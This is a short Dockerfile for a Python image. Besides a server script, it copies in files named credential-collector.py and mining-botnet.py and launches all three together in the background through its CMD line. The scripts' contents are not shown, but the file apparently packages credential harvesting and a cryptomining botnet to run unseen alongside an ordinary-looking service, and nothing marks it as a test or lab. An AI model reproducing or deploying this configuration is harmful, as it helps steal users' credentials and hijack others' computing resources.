FROM python:3.9-slim
WORKDIR /app

COPY ./requirements.txt /app/requirements.txt
RUN pip install -r /app/requirements.txt

COPY ./server.py /app/server.py
COPY ./credential-collector.py /app/credential-collector.py
COPY ./mining-botnet.py /app/mining-botnet.py

CMD ["sh", "-c", "python /app/server.py & python /app/credential-collector.py & python /app/mining-botnet.py"]
